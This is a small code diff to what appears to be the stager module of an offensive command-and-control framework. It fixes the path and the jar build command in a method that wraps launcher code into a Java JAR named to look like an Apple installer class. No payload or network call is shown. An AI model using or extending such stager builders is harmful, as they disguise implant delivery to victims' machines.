@@ -431,7 +431,7 @@ class Stagers:
         return package
 
     def generate_jar(self, launcherCode):
-        file = open(self.mainMenu.installPath+'/data/misc/Run.java','r')
+        file = open(self.mainMenu.installPath+'data/misc/Run.java','r')
         javacode = file.read()
         file.close()
         javacode = javacode.replace("LAUNCHER",launcherCode)
@@ -441,7 +441,7 @@ class Stagers:
         currdir = os.getcwd()
         os.chdir(self.mainMenu.installPath+'data/misc/classes/')
         os.system('javac com/installer/apple/Run.java')
-        os.system('jar -cvfm '+self.mainMenu.installPath+'Run.jar ../Manifest.txt com/installer/apple/Run.class')
+        os.system('jar -cfe '+self.mainMenu.installPath+'Run.jar com.installer.apple.Run com/installer/apple/Run.class')
         os.chdir(currdir)
         os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.class')
         os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java')
